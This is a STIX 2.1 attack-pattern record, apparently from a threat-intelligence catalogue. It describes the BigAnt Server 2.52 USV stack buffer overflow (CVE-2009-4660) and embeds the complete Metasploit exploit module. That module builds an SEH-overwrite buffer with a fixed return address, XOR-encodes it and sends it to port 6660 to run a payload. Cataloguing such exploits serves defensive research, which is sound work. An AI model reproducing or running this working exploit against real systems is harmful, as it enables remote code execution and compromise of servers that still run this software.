{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebf964fc-9da0-4f3c-b0da-8a559a5ab1f5",
    "created": "2024-08-14T16:47:07.247625Z",
    "modified": "2024-08-14T16:47:07.247629Z",
    "name": "BigAnt Server 2.52 USV Buffer Overflow",
    "description": " This exploits a stack buffer overflow in the BigAnt Messaging Service part of the BigAnt Server product suite. This module was tested successfully against version 2.52.  NOTE: The AntServer service does not restart, you only get one shot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bigant_server_usv.rb",
            "external_id": "bigant_server_usv.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4660"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BigAnt Server 2.52 USV Buffer Overflow',\n      'Description'    => %q{\n        This exploits a stack buffer overflow in the BigAnt Messaging Service,\n        part of the BigAnt Server product suite. This module was tested\n        successfully against version 2.52.\n\n        NOTE: The AntServer service does not restart, you only get one shot.\n      },\n      'Author' \t =>\n        [\n          'Lincoln',\n          'DouBle_Zer0',\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4660' ],\n          [ 'OSVDB', '61386' ],\n          [ 'EDB', '10765' ],\n          [ 'EDB', '10973' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => (218+709+35),\n          'BadChars' => \"\\x2a\\x20\\x27\\x0a\\x0f\",\n          # pre-xor with 0x2a:\n          #'BadChars' => \"\\x00\\x0a\\x0d\\x20\\x25\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'BigAnt 2.52 Universal', { 'Ret' => 0x1b019fd6 } ], # Tested OK (jduck) p/p/r msjet40.dll xpsp3\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2009-12-29'))\n\n      register_options([Opt::RPORT(6660)])\n  end\n\n  def exploit\n    connect\n\n    sploit = \"\"\n    sploit << payload.encoded\n    sploit << generate_seh_record(target.ret)\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + payload_space.to_s).encode_string\n    sploit << rand_text_alphanumeric(3)\n    sploit << [0xdeadbeef].pack('V') * 3\n\n    # the buffer gets xor'd with 0x2a !\n    sploit = sploit.unpack(\"C*\").map{|c| c ^ 0x2a}.pack(\"C*\")\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(\"USV \" + sploit + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-29",
    "x_mitre_platforms": [
        "win'"
    ]
}